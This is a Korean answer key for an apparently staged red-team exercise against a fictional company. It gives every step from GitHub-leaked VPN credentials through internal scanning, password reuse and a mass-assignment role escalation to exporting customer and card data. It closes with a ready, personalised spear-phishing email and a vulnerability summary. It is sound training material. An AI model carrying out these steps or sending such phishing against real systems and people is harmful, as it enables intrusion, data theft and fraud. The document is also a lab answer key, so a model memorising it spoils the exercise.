# 공격 체인 — 정답 루트

Red Team 시나리오 전체 흐름. GitHub credential 발견부터 스피어피싱까지.

---

## 전체 흐름

```
① GitHub OSINT
② VPN credential 발견
③ VPN 접속
④ 내부망 포트 스캔
⑤ Admin 대시보드 발견 및 로그인
⑥ 고객 데이터 export
⑦ Mass Assignment로 권한 상승
⑧ 카드/결제/거래 데이터 export
⑨ MinIO 저장
⑩ 스피어피싱 이메일 발송
```

---

## ① GitHub OSINT

공개 레포지토리 탐색:
```
https://github.com/1242525/argos-firmware
```

Commits 탭 → 커밋 히스토리 탐색

---

## ② VPN credential 발견

### 낚시용 커밋 (실패)

`feature/firmware-admin-setup` 브랜치 → `config/firmware-admin.conf`:
```
VPN_USER=firmware-admin
VPN_PASS=FwAdm1n@2024!
MFA=enabled          ← MFA 있음 → VPN 접속 실패
```

### 정답 커밋 (성공)

master 브랜치 깊은 히스토리 → `.env.bak` 삭제 커밋:
```
VPN_HOST=vpn.argos-internal.com
VPN_USER=deploy-bot
VPN_PASS=d3pl0y-B0t@secure    ← MFA 없음 → VPN 접속 성공
ADMIN_URL=http://10.10.0.10/admin  ← 내부망 admin 서버 힌트
ROLE=deploy
```

---

## ③ VPN 접속

`.ovpn` 파일 + credential로 접속:

```bash
sudo openvpn ~/deploy-bot.ovpn
# username: deploy-bot
# password: d3pl0y-B0t@secure
```

접속 성공 시:
```
Initialization Sequence Completed
ifconfig 10.8.0.6   ← 내부망 IP 할당
```

VPN 접속 로그에서 내부망 대역 확인:
```
PUSH_REPLY,route 10.10.0.0 255.255.0.0,...
```

→ `10.10.0.0/16`이 내부망 대역임을 확인

---

## ④ 내부망 포트 스캔

`.env.bak`에서 `ADMIN_URL=http://10.10.0.10/admin` 힌트 확인.
내부망 대역 `10.10.0.0/16`에서 관리자 API에 자주 쓰이는 포트 스캔.

```bash
# top-ports: 실제 인터넷에서 가장 많이 사용되는 포트 상위 1000개 스캔
nmap -Pn -sT --top-ports 1000 --max-rtt-timeout 10s 10.10.0.0/16
```

결과에서 8001 open인 IP 발견:
```
10.10.3.2:8001 open  ← Admin API
10.10.5.2:8080 open  ← Jenkins
```

---

## ⑤ Admin 대시보드 발견 및 로그인

브라우저에서 `http://10.10.3.2` 접속 → Admin 로그인 화면 발견.

**동일 비밀번호 재사용** (VPN과 Admin API 동일):
```
username: deploy-bot
password: d3pl0y-B0t@secure
```

로그인 응답:
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "username": "deploy-bot",
  "role": "operator"
}
```

---

## ⑥ 고객 데이터 export

대시보드 Tenants/Customers 페이지 → CSV/JSON export.

또는 API 직접 호출:
```bash
curl -X POST "http://10.10.3.2:8001/admin/export/customers" \
  -H "Authorization: Bearer {JWT}" \
  --max-time 120
```

응답:
```json
{
  "record_count": 100,
  "filename": "customers_20260519_054949.csv",
  "minio_url": "http://10.10.4.2:9000/exports/customers_20260519_054949.csv",
  "download_url": "/admin/export/download/customers_20260519_054949.csv"
}
```

탈취 데이터:
```
customer_id, tenant_id, username(이름), email, account_status, last_access_ip ...
```

---

## ⑦ Mass Assignment로 권한 상승

operator role로는 결제/카드 데이터 접근 불가 → admin으로 권한 상승.

**Burp Suite 프록시 설정 (127.0.0.1:8081)**

대시보드 우측 상단 아바타 → Settings → username 수정 → 저장 클릭.

Burp Suite가 PATCH 요청 가로채기:
```
PATCH /admin/staff/me HTTP/1.1
Host: 10.10.3.2:8001
Authorization: Bearer {JWT}

{"username": "deploy-bot"}
```

body에 role 필드 추가 후 Forward:
```json
{"username": "deploy-bot", "role": "admin"}
```

백엔드가 검증 없이 role 변경 → DB 반영.

**재로그인** → admin JWT 발급:
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "username": "deploy-bot",
  "role": "admin"    ← 변경됨
}
```

---

## ⑧ 카드/결제/거래 데이터 export

admin role로 Payment Info, Transactions 페이지 접근 가능.

```bash
# 카드 정보 export
curl -X POST "http://10.10.3.2:8001/admin/export/payment-info" \
  -H "Authorization: Bearer {admin_JWT}" \
  --max-time 120

# 거래 내역 export
curl -X POST "http://10.10.3.2:8001/admin/export/transactions" \
  -H "Authorization: Bearer {admin_JWT}" \
  --max-time 120
```

탈취 데이터:
```
payment_id, customer_id, card_last4, card_brand, card_expiry,
card_holder, billing_addr, pg_token ...

transaction_id, customer_id, product_type, amount, pg_name,
card_last4, status, transaction_at ...
```

---

## ⑨ MinIO 저장

export 응답의 `minio_url`로 직접 접근 (public 버킷):
```bash
curl http://10.10.4.2:9000/exports/payment_info_20260519_054038.csv
```

URL만 알면 VPN 재접속 후에도 언제든 재접근 가능.

---

## ⑩ 스피어피싱 이메일 발송

고객 정보 + 카드 정보 + 거래 내역을 조합해 개인화된 피싱 이메일 생성.

### 데이터 조합 예시 (김민준)

```
이름:     김민준
이메일:   minjun.kim@naver.com
카드:     VISA *6882 (만료 02/2028)
최근거래: 디바이스 구매 89,000원
```

### 피싱 이메일

```
제목: [ARGOS] 결제 승인 오류 안내 - 즉시 확인이 필요합니다

김민준 고객님께,

고객님께서 최근 진행하신 아래 결제 건에서 카드사 승인 처리 중
오류가 발생하였습니다.

─────────────────────────────────
결제 일시: 2026-05-19 14:23:08
결제 수단: VISA ****-****-****-6882
결제 금액: 89,000원 (VAT 포함)
주문 내용: ARGOS 디바이스 구매
오류 코드: ERR-CARD-3014 (카드사 일시적 승인 거절)
─────────────────────────────────

결제가 정상 처리되지 않아 서비스 이용에 제한이 발생할 수 있습니다.
아래 링크를 통해 결제 정보를 재확인해 주시기 바랍니다.

👉 결제 정보 확인하기 → http://argos-payment-help.com/verify?uid=CUST-A-001

결제 관련 문의사항이 있으시면 고객센터(1588-0000)로 연락 주시기 바랍니다.

ARGOS 고객보안팀 드림
cs@argos-iot.co.kr
```

### 왜 속는가

| 요소 | 내용 |
|---|---|
| 실명 | 김민준 — 실제 이름 |
| 실제 카드 끝 4자리 | *6882 — 본인 카드 확신 |
| 실제 결제 금액 | 89,000원 — 실제 거래 내역과 일치 |
| 실제 서비스명 | ARGOS — 가입한 서비스 |
| 자연스러운 문체 | 과도한 긴박감 없이 안내 메일처럼 보임 |

---

## 취약점 요약

| 취약점 | 내용 |
|---|---|
| Credential GitHub 노출 | `.env.bak` 커밋 히스토리에 VPN 계정 정보 |
| VPN MFA 미적용 | deploy-bot 계정 MFA 없음 → credential만으로 접속 |
| 동일 비밀번호 사용 | VPN과 Admin API 동일 → 1개 탈취로 2개 시스템 접근 |
| OWASP A01 (Broken Access Control) | operator가 전체 테넌트 데이터 export 가능 |
| Mass Assignment | PATCH /admin/staff/me role 필드 검증 없음 → 권한 상승 |
| MinIO public 버킷 | URL만 알면 영구 접근 가능 |
| 결제 API role 체크 없음 | 프론트만 admin 체크, 백엔드 미검증 |

---

## 계정별 결과

| 계정 | VPN | Admin 로그인 | export | 권한 상승 | 결제 데이터 |
|---|---|---|---|---|---|
| firmware-admin | 실패 (MFA) | X | X | X | X |
| ops-monitor | 성공 | O (developer) | X | X | X |
| **deploy-bot** | **성공** | **O (operator→admin)** | **O** | **O** | **O ← 정답** |
